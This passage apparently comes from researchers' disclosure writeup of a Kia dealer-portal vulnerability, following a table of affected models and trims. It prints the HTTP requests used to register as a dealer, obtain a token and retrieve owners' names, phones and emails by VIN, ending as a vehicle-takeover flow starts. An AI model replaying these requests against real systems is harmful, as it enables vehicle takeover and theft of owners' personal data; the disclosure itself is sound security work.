SOUL Plus ✅ ❌ ❌ ❌ ❌ 2019 SPORTAGE EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2019 SPORTAGE EX (Sports Appearance Pkg) ❌ ❌ ❌ ❌ ❌ 2019 SPORTAGE EX ❌ ❌ ❌ ❌ ❌ 2019 SPORTAGE EX (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2019 SPORTAGE LX (Popular Pkg) ❌ ❌ ❌ ❌ ❌ 2019 SPORTAGE SX ✅ ❌ ❌ ❌ ❌ 2019 SPORTAGE SX (Turbo Pkg) ✅ ❌ ❌ ❌ ❌ 2019 SOUL EV Soul EV ✅ ✅ ✅ ✅ ❌ 2019 SOUL EV Soul EV+ ✅ ✅ ✅ ✅ ❌ 2019 STINGER GT ❌ ❌ ❌ ❌ ❌ 2019 STINGER Premium ✅ ❌ ❌ ❌ ❌ 2019 STINGER GT1 ✅ ❌ ❌ ❌ ❌ 2019 STINGER GT2 ✅ ❌ ❌ ❌ ❌ 2019 STINGER GTS ✅ ❌ ❌ ❌ ❌ 2019 STINGER Stinger ❌ ❌ ❌ ❌ ❌ 2019 STINGER Stinger (Sun and Sound) ✅ ❌ ❌ ❌ ❌ 2018 CADENZA Cadenza (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2018 CADENZA Limited ✅ ❌ ❌ ❌ ❌ 2018 CADENZA Premium (Luxury + Technology) ✅ ❌ ❌ ❌ ❌ 2018 FORTE EX ❌ ❌ ❌ ❌ ❌ 2018 FORTE EX ❌ ❌ ❌ ❌ ❌ 2018 FORTE EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2018 FORTE LX (Popular Pkg) ❌ ❌ ❌ ❌ ❌ 2018 FORTE LX ❌ ❌ ❌ ❌ ❌ 2018 FORTE SX AT ❌ ❌ ❌ ❌ ❌ 2018 FORTE S ❌ ❌ ❌ ❌ ❌ 2018 FORTE SX MT ❌ ❌ ❌ ❌ ❌ 2018 NIRO LX ❌ ❌ ❌ ❌ ❌ 2018 NIRO EX ❌ ❌ ❌ ❌ ❌ 2018 NIRO EX (Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2018 NIRO EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2018 NIRO EX (Touring Pkg) ❌ ❌ ❌ ❌ ❌ 2018 NIRO FE ❌ ❌ ❌ ❌ ❌ 2018 NIRO Touring ✅ ❌ ❌ ❌ ❌ 2018 NIRO PHEV EX ✅ ✅ ✅ ✅ ❌ 2018 NIRO PHEV EX Premium ✅ ✅ ✅ ✅ ❌ 2018 NIRO PHEV LX ✅ ✅ ✅ ✅ ❌ 2018 OPTIMA LX ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA EX ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA S (Convenience) ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA EX (Premium) ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA LX (Convenience) ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA LX Turbo ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA S ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA SX Turbo ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA SX Turbo (Limited Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA SX Turbo (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA HYBRID LX ❌ ❌ ❌ ❌ ❌ 2018 OPTIMA HYBRID EX (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA HYBRID EX ✅ ❌ ❌ ❌ ❌ 2018 OPTIMA HYBRID LX (Convenience) ❌ ❌ ❌ ❌ ❌ 2018 RIO EX (4D) ❌ ❌ ❌ ❌ ❌ 2018 RIO EX (5D) ❌ ❌ ❌ ❌ ❌ 2018 SEDONA LX (Essentials + Adv Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2018 SEDONA EX ❌ ❌ ❌ ❌ ❌ 2018 SEDONA LX (Essentials Pkg) ❌ ❌ ❌ ❌ ❌ 2018 SEDONA Limited ✅ ❌ ❌ ❌ ❌ 2018 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2018 SORENTO EX ❌ ❌ ❌ ❌ ❌ 2018 SORENTO LX ❌ ❌ ❌ ❌ ❌ 2018 SORENTO EX (Touring Pkg) ❌ ❌ ❌ ❌ ❌ 2018 SORENTO Limited ✅ ❌ ❌ ❌ ❌ 2018 SORENTO EX Turbo ❌ ❌ ❌ ❌ ❌ 2018 SORENTO EX Turbo (Touring Pkg) ❌ ❌ ❌ ❌ ❌ 2018 SORENTO LX ❌ ❌ ❌ ❌ ❌ 2018 SORENTO LX (Convenience) ❌ ❌ ❌ ❌ ❌ 2018 SORENTO SX ✅ ❌ ❌ ❌ ❌ 2018 SOUL Exclaim AT (std + IP2) ✅ ❌ ❌ ❌ ❌ 2018 SOUL Plus AT ❌ ❌ ❌ ❌ ❌ 2018 SOUL Base AT ❌ ❌ ❌ ❌ ❌ 2018 SOUL Exclaim AT (SNS + TWS) ✅ ❌ ❌ ❌ ❌ 2018 SOUL Plus AT (UVO + AU + Primo) ✅ ❌ ❌ ❌ ❌ 2018 SOUL Plus AT ❌ ❌ ❌ ❌ ❌ 2018 SOUL Plus AT (UVO + AU) ✅ ❌ ❌ ❌ ❌ 2018 SOUL EV Soul EV ✅ ✅ ✅ ✅ ❌ 2018 SOUL EV Soul EV+ ✅ ✅ ✅ ✅ ❌ 2018 SPORTAGE EX (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2018 SPORTAGE EX ❌ ❌ ❌ ❌ ❌ 2018 SPORTAGE EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2018 SPORTAGE LX (Popular Pkg) ❌ ❌ ❌ ❌ ❌ 2018 SPORTAGE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2018 STINGER GT1 ✅ ❌ ❌ ❌ ❌ 2018 STINGER GT ✅ ❌ ❌ ❌ ❌ 2018 STINGER GT2 ✅ ❌ ❌ ❌ ❌ 2018 STINGER LX ❌ ❌ ❌ ❌ ❌ 2018 STINGER Premium ✅ ❌ ❌ ❌ ❌ 2017 CADENZA Premium (Luxury + Technology) ✅ ❌ ❌ ❌ ❌ 2017 CADENZA Cadenza (Ltd) ✅ ❌ ❌ ❌ ❌ 2017 CADENZA Cadenza (Premium) ✅ ❌ ❌ ❌ ❌ 2017 FORTE S ❌ ❌ ❌ ❌ ❌ 2017 FORTE EX ❌ ❌ ❌ ❌ ❌ 2017 FORTE SX ❌ ❌ ❌ ❌ ❌ 2017 FORTE SX (Premium Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 FORTE EX (Premium Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 FORTE LX (Popular Pkg) ❌ ❌ ❌ ❌ ❌ 2017 FORTE S (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 FORTE S (Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2017 FORTE KOUP EX ✅ ❌ ❌ ❌ ❌ 2017 FORTE KOUP SX ✅ ❌ ❌ ❌ ❌ 2017 FORTE KOUP SX (Manual Transmission) ✅ ❌ ❌ ❌ ❌ 2017 K900 Luxury V8 ✅ ✅ ✅ ✅ ❌ 2017 K900 Luxury V8 (VIP Plus) ✅ ✅ ✅ ✅ ❌ 2017 K900 Luxury ✅ ✅ ✅ ✅ ❌ 2017 K900 Luxury (VIP) ✅ ✅ ✅ ✅ ❌ 2017 K900 Premium ✅ ✅ ✅ ✅ ❌ 2017 NIRO EX ❌ ❌ ❌ ❌ ❌ 2017 NIRO FE ❌ ❌ ❌ ❌ ❌ 2017 NIRO LX ❌ ❌ ❌ ❌ ❌ 2017 NIRO Touring ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA EX ❌ ❌ ❌ ❌ ❌ 2017 OPTIMA LX Turbo (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA LX Turbo (Value) ❌ ❌ ❌ ❌ ❌ 2017 OPTIMA Limited Turbo ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA SX Turbo ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA SX Turbo (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA SX Turbo (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA HYBRID LX (Convenience) ❌ ❌ ❌ ❌ ❌ 2017 OPTIMA HYBRID EX ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA HYBRID EX (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA HYBRID LX ❌ ❌ ❌ ❌ ❌ 2017 RIO EX (4D/Eco) ✅ ❌ ❌ ❌ ❌ 2017 RIO EX (5D/Eco) ✅ ❌ ❌ ❌ ❌ 2017 RIO SX (5D) ✅ ❌ ❌ ❌ ❌ 2017 OPTIMA PHEV EX ✅ ✅ ✅ ✅ ❌ 2017 SEDONA EX ❌ ❌ ❌ ❌ ❌ 2017 SEDONA EX (Adv Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SEDONA LX (Essentials + Adv Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SEDONA LX (Essentials Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SEDONA LX (UVO Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SEDONA Limited ✅ ❌ ❌ ❌ ❌ 2017 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2017 SEDONA SX (Adv Touring Pkg) ✅ ❌ ❌ ❌ ❌ 2017 SORENTO EX ❌ ❌ ❌ ❌ ❌ 2017 SORENTO LX (Convenience + Essentials Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SORENTO EX (Touring Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SORENTO Limited ✅ ❌ ❌ ❌ ❌ 2017 SORENTO LX (Convenience + Adv Technology Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SORENTO LX (Convenience) ❌ ❌ ❌ ❌ ❌ 2017 SORENTO SX ✅ ❌ ❌ ❌ ❌ 2017 SOUL Exclaim ❌ ❌ ❌ ❌ ❌ 2017 SOUL Exclaim (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 SOUL Plus AT ❌ ❌ ❌ ❌ ❌ 2017 SOUL Plus AT (UVO + AU + Primo + S10) ✅ ❌ ❌ ❌ ❌ 2017 SOUL Plus AT (UVO + AU + Primo) ✅ ❌ ❌ ❌ ❌ 2017 SOUL Plus AT (UVO + AU) ✅ ❌ ❌ ❌ ❌ 2017 SOUL EV Soul EV ✅ ✅ ✅ ✅ ❌ 2017 SOUL EV Soul EV+ ✅ ✅ ✅ ✅ ❌ 2017 SPORTAGE LX (Popular Pkg + Cool Connected Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SPORTAGE EX ❌ ❌ ❌ ❌ ❌ 2017 SPORTAGE EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2017 SPORTAGE EX (Premium Pkg) ❌ ❌ ❌ ❌ ❌ 2017 SPORTAGE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 CADENZA Premium (Luxury + Technology) ✅ ❌ ❌ ❌ ❌ 2016 CADENZA Cadenza (Std) ✅ ❌ ❌ ❌ ❌ 2016 CADENZA Limited ✅ ❌ ❌ ❌ ❌ 2016 CADENZA Premium (Luxury) ✅ ❌ ❌ ❌ ❌ 2016 FORTE EX (Premium Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 FORTE EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 FORTE EX (Premium Plus Pkg) ✅ ❌ ❌ ❌ ❌ 2016 FORTE SX (Premium Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 FORTE KOUP EX (Premium Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 FORTE KOUP SX (Premium Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 K900 Luxury ✅ ✅ ✅ ✅ ❌ 2016 K900 Luxury (VIP) ✅ ✅ ✅ ✅ ❌ 2016 K900 Luxury V8 ✅ ✅ ✅ ✅ ❌ 2016 K900 Luxury V8 (VIP Plus) ✅ ✅ ✅ ✅ ❌ 2016 K900 Premium ✅ ✅ ✅ ✅ ❌ 2016 K900 Premium(IHP) ✅ ✅ ✅ ✅ ❌ 2016 K900 Luxury V8 (WV2,CPL) ✅ ✅ ✅ ✅ ❌ 2016 K900 Premium(Std) ✅ ✅ ✅ ✅ ❌ 2016 OPTIMA EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA LX Turbo (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA Limited Turbo ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA SX Turbo ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA SX Turbo (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA SX Turbo (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA HYBRID LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA HYBRID EX ✅ ❌ ❌ ❌ ❌ 2016 OPTIMA HYBRID EX (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2016 RIO EX (4D/Eco) ✅ ❌ ❌ ❌ ❌ 2016 RIO EX (5D/Eco) ✅ ❌ ❌ ❌ ❌ 2016 RIO SX (4D) ✅ ❌ ❌ ❌ ❌ 2016 RIO SX (5D) ✅ ❌ ❌ ❌ ❌ 2016 SEDONA EX ✅ ❌ ❌ ❌ ❌ 2016 SEDONA EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SEDONA LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2016 SEDONA Limited ✅ ❌ ❌ ❌ ❌ 2016 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2016 SEDONA SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SORENTO EX ✅ ❌ ❌ ❌ ❌ 2016 SORENTO EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SORENTO Limited ✅ ❌ ❌ ❌ ❌ 2016 SORENTO EX (Premium Pkg + Touring Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SORENTO LX ✅ ❌ ❌ ❌ ❌ 2016 SORENTO LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2016 SORENTO SX ✅ ❌ ❌ ❌ ❌ 2016 SOUL Plus (Audio Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SOUL Exclaim ✅ ❌ ❌ ❌ ❌ 2016 SOUL Exclaim (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SOUL Plus (Primo Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SOUL Plus (Signature 2.0 Sp. Ed.) ✅ ❌ ❌ ❌ ❌ 2016 SOUL Plus (Special Edition) ✅ ❌ ❌ ❌ ❌ 2016 SOUL EV Soul EV ✅ ✅ ✅ ❌ ❌ 2016 SOUL EV Soul EV+ ✅ ✅ ✅ ❌ ❌ 2016 SPORTAGE EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2016 SPORTAGE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 CADENZA Limited ✅ ❌ ❌ ❌ ❌ 2015 CADENZA Premium (Luxury + Technology) ✅ ❌ ❌ ❌ ❌ 2015 CADENZA Premium (Luxury) ✅ ❌ ❌ ❌ ❌ 2015 CADENZA Premium (Std) ✅ ❌ ❌ ❌ ❌ 2015 FORTE EX (Premium Pkg + Technology Pkg + UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE EX (Premium Pkg + UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE EX (UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE SX ✅ ❌ ❌ ❌ ❌ 2015 FORTE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE LX (Popular Pkg + UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE SX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE KOUP SX ✅ ❌ ❌ ❌ ❌ 2015 FORTE KOUP EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE KOUP SX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2015 FORTE KOUP SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA LX (Convenience Plus Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA Limited Turbo ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA SX (Premium) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA SX Turbo (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA SX Turbo (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA HYBRID EX ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA HYBRID EX (Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA HYBRID LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2015 OPTIMA HYBRID SX ✅ ❌ ❌ ❌ ❌ 2015 SEDONA SX ✅ ❌ ❌ ❌ ❌ 2015 SEDONA EX (Premium Plus Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SEDONA EX (UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SEDONA LX ✅ ❌ ❌ ❌ ❌ 2015 SEDONA LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2015 SEDONA Limited ✅ ❌ ❌ ❌ ❌ 2015 SEDONA SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SORENTO EX ✅ ❌ ❌ ❌ ❌ 2015 SORENTO EX (Touring Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SORENTO LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2015 SORENTO Limited ✅ ❌ ❌ ❌ ❌ 2015 SORENTO SX ✅ ❌ ❌ ❌ ❌ 2015 SOUL Exclaim ✅ ❌ ❌ ❌ ❌ 2015 SOUL Exclaim (Sun & Sound Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SOUL Automatic Transmission ✅ ❌ ❌ ❌ ❌ 2015 SOUL Exclaim (Sun & Sound Pkg + The Whole Shabang Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SOUL Plus (Audio + UVO) ✅ ❌ ❌ ❌ ❌ 2015 SOUL Plus (UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SOUL EV Soul EV ✅ ✅ ✅ ❌ ❌ 2015 SOUL EV Soul EV+ ✅ ✅ ✅ ❌ ❌ 2015 SPORTAGE EX ✅ ❌ ❌ ❌ ❌ 2015 SPORTAGE EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SPORTAGE LX (Popular Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SPORTAGE LX (UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2015 SPORTAGE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 CADENZA Premium (Luxury) ✅ ❌ ❌ ❌ ❌ 2014 CADENZA Premium (Luxury + Technology) ✅ ❌ ❌ ❌ ❌ 2014 CADENZA Limited ✅ ❌ ❌ ❌ ❌ 2014 CADENZA Premium (Std) ✅ ❌ ❌ ❌ ❌ 2014 FORTE SX ✅ ❌ ❌ ❌ ❌ 2014 FORTE EX ✅ ❌ ❌ ❌ ❌ 2014 FORTE EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE SX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE KOUP EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE KOUP SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE KOUP EX ✅ ❌ ❌ ❌ ❌ 2014 FORTE KOUP EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 FORTE KOUP SX ✅ ❌ ❌ ❌ ❌ 2014 FORTE KOUP SX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2014 OPTIMA HYBRID EX (Premium Pkg + Technology Pkg) ✅ ❌ ❌ ❌ ❌ 2014 OPTIMA HYBRID LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2014 SORENTO EX ✅ ❌ ❌ ❌ ❌ 2014 SORENTO EX (Touring Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SORENTO LX (Convenience + Premium Pkg + Touring Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SORENTO LX (Convenience + Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SORENTO LX (Convenience) ✅ ❌ ❌ ❌ ❌ 2014 SORENTO Limited ✅ ❌ ❌ ❌ ❌ 2014 SORENTO SX ✅ ❌ ❌ ❌ ❌ 2014 SOUL Exclaim ✅ ❌ ❌ ❌ ❌ 2014 SOUL Exclaim (Sun & Sound Pkg + The Whole Shabang Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SOUL Plus (Audio + UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SOUL Plus (UVO Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SPORTAGE EX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SPORTAGE LX (Popular Pkg) ✅ ❌ ❌ ❌ ❌ 2014 SPORTAGE EX ✅ ❌ ❌ ❌ ❌ 2014 SPORTAGE SX ✅ ❌ ❌ ❌ ❌ 2014 SPORTAGE SX (Premium Pkg) ✅ ❌ ❌ ❌ ❌ Credit Neiko Rivera (https://twitter.com/specters) Sam Curry (https://twitter.com/samwcyo) Justin Rhinehart (https://twitter.com/sshell_) Ian Carroll (https://twitter.com/iangcarroll) Vulnerability Writeup Around two years ago, a few hackers and I hunted for vulnerabilities on over a dozen different car companies. We discovered critical issues that would've allowed attackers to remotely locate, disable starters, unlock, and start an estimated 15.5 million vehicles. There was a big reaction to this. Paul Roberts, founder of The Security Ledger, even testified about these findings in a US congressional hearing. Since so much time had passed, we decided to revisit a few of the larger companies to see if we couldn't discover any new issues. The first one we spent time on was Kia. When we began looking at Kia, we originally focused on the owners.kia.com website and the Kia Connect iOS app com.myuvo.link. Both of these applications were interesting because they could execute internet-to-vehicle commands. While the owners website and the mobile app served the same purpose, they handled vehicle commands differently. The owners website used a backend reverse-proxy to forward user commands to the api.owners.kia.com backend service that was actually responsible for actually executing vehicle commands, whereas the mobile app instead accessed this API directly. The following HTTP request shows how the owners.kia.com website will proxy an API request to the api.owners.kia.com host to unlock a car door. HTTP Request to Unlock Car Door on the \"owners.kia.com\" website POST /apps/services/owners/apigwServlet.html HTTP/2 Host: owners.kia.com Httpmethod: GET Apiurl: /door/unlock Servicetype: postLoginCustomer Cookie: JSESSIONID=SESSION_TOKEN; After sending the above HTTP request that originated from the owners.kia.com website, the Kia backend will generate a Sid session ID header that is consumed by the backend API using our JSESSIONID as auth, then finally send the forwarded HTTP request to the api.owners.kia.com website in the following format. HTTP Request Formed and Proxied by Server GET /apigw/v1/rems/door/unlock HTTP/1.1 Host: api.owners.kia.com Sid: 454817d4-b228-4103-a26f-884e362e8dee Vinkey: 3ecc1a19-aefd-4188-a7fe-1723e1663d6e The important headers in the above HTTP request are the Sid (session token) and Vinkey (UUID that indexes to VIN). There are various other headers included that are all necessary to access the API itself, but those are the two related to vehicle access controls. Both of the above HTTP requests were in the same area we had found the original Kia vulnerabilities in 2023. Since we were already super familiar with the user side of things, we decided to look at the Kia Dealer website instead. Targeting Kia Dealer Infrastructure Something we'd never tested was how Kia actually performed vehicle activations for new purchases. After speaking to a few people, we learned that Kia would ask for your email address at the dealership and you'd receive a registration link to either register a new Kia account or add your newly purchased vehicle to your pre-existing Kia account. We asked if they could share the registration links given to them by Kia, and nicely enough, they forwarded their emails. We copied the following URL from the hyperlink: https://kiaconnect.kdealer.com/content/kDealer/en/kiauser.html?token=dealer_generated_access_token&vin=example_vin&scenarioType=3 Super interesting! The kiaconnect.kdealer.com domain was one we'd never seen before. We opened the URL and saw the following endpoint: Kiaconnect Initial Vehicle Registration URL In the above URL, the token parameter (otherwise known as a VIN Key) is an access token generated by a Kia dealer as a one-time grant to modify the vehicle specified in the vin parameter. After loading the above URL, the following HTTP request will be sent to validate that the token has not expired or been used. POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com { \"token\": \"985a49f0-1fe5-4d36-860e-d9b93272072b\", \"vin\": \"5XYP3DHC9NG310533\", \"scenarioType\": 3, \"loginPref\": null } Very interesting. The HTTP request sent to validate the one-time access token was being sent to the same /apps/services/kdealer/apigwServlet.html URI as the previous owners.kia.com request, except this time, it was being sent on the Kia Connect dealer website. This likely meant that the dealer infrastructure had a similar forwarding proxy to an internal API for dealership functionality. We dug through the JavaScript looking for interesting APIGW calls and found what appeared to be employee-only functionality. There were references to dealer vehicle lookup, account lookup, enroll, unenroll, and many more dealer related API calls. dealerVehicleLookUp() { this.displayLoader = !0, this.vinToEnroll = \"eDelivery\" != this.entryPoint ? this.vinToEnroll.replace(/\\s/g, \"\") : this.userDetails.vin, \"17\" == this.vinToEnroll.length && this.landingPageService.postOffice({ vin: this.vinToEnroll }, \"/dec/dlr/dvl\", \"POST\", \"postLoginCustomer\").subscribe(i => { i && (i.hasOwnProperty(\"body\") && \"0\" == i.body.status.statusCode ? this.processDvlData(i.body) : \"1003\" == i.body.status.errorCode && \"kia-dealer\" == this.entryPoint ? this.reRouteSessionExpire() : (this.displayLoader = !1, this.alertMessage = i.body.status.errorMessage, document.getElementById(\"triggerGeneralAlertModal\").click())) }) } To test if we could access any of these endpoints, we formed the HTTP request to the dealer APIGW endpoint with our own dealer token (Appid header) and the VIN of a vehicle that we owned. Attempted HTTP Request to Search VIN using Kia Dealer APIGW Endpoint POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /dec/dlr/dvl { \"vin\": \"1HGBH41JXMN109186\" } HTTP Response HTTP/1.1 401 Unauthorized Content-type: application/json { \"status\": { \"statusCode\": 1, \"errorType\": 1, \"errorCode\": 1003, \"errorMessage\": \"Session Key is either invalid or expired\" } } Nope. It did not seem like the dealer endpoints wanted to work with the access token that was given to us via email when purchasing a new car. We thought back to the original owners.kia.com website and then wondered: what if there was a way to just register as a dealer, generate an access token, then use that access token here? The kiaconnect.kdealer.com website seemed to have the same API format, so maybe we could just copy the format, register an account, and login? POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /prof/registerUser { \"userCredential\": { \"firstName\": \"Sam\", \"lastName\": \"Curry\", \"userId\": \"normal.user@gmail.com\", \"password\": \"FakePass123!\", \"acceptedTerms\": 1 } } It returned 200 OK! It seemed that we could register on the Kia Dealer website using the same HTTP request to register on the Kia Owners website. We quickly tried to login and generate an access token: POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Httpmethod: POST Apiurl: /prof/authUser { \"userCredential\": { \"userId\": \"normal.user@gmail.com\", \"password\": \"FakePass123!\" } } The login was valid, the server returned an HTTP response with a session cookie. HTTP/1.1 200 OK Sid: 123e4567-e89b-12d3-a456-426614174000 We sent our generated access token to the previously unauthorized dealer APIGW endpoint to search a VIN. HTTP Request to Search VIN using Kia Dealer APIGW Endpoint (with “dda” access token) POST /apps/services/kdealer/apigwServlet.html HTTP/1.1 Host: kiaconnect.kdealer.com Appid: 123e4567-e89b-12d3-a456-426614174000 Apiurl: /dec/dlr/dvl { \"vin\": \"1HGBH41JXMN109186\" } HTTP Response HTTP/1.1 200 OK Content-type: application/json { \"payload\": { \"billingSubscriptionSupported\": 1, \"digitalKeySupported\": 0, \"generation\": \"3\", \"profiles\": [ { \"address\": {}, \"billSubscriptionStatus\": 1, \"digitalKeyStatus\": 0, \"email\": \"victim@gmail.com\", \"enrollmentReqStatus\": 1, \"enrollmentStatus\": 1, \"firstName\": \"yeet\", \"lastName\": \"yeet\", \"loginId\": \"victim@gmail.com\", \"phone\": \"4027181388\", \"phoneType\": 3, \"wifiHotspotStatus\": 0 } ], \"vinAddedToAccount\": 1, \"wifiHotspotSupported\": 1 } } After registering and authenticating to a dealer account, we were able to generate a valid access token that could be used to call the backend dealer APIs! The HTTP response contained the vehicle owner's name, phone number, and email address. We were able to authenticate into the dealer portal using our normal app credentials and the modified channel header. This meant that we could likely hit all other dealer endpoints. Taking Over Vehicles After sifting through the JavaScript for a few hours, we finally learned how the enrollment, unenrollment, and vehicle modification endpoints worked. The following four HTTP requests could be sent in order to gain access to a victim's vehicle. Full high level attack flow (1) Generate the Dealer Token and retrieve the “token” header from the HTTP Response POST 